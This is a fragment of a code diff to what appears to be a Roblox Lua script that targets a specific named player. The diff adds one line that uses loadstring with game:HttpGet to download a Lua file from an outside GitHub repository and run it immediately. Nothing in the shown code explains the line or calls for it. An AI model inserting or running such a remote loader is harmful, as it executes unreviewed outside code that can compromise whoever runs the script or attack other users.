@@ -299,6 +299,7 @@ do
     end)
 
     -- Eyed really did that shit
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ClownAdept/ClownScripts/refs/heads/main/Cheeda.lua"))()
     local Players = game:GetService("Players")
     local TARGET_NAME = "SternalVoyage38"
     local function setupPlayerChat(player)
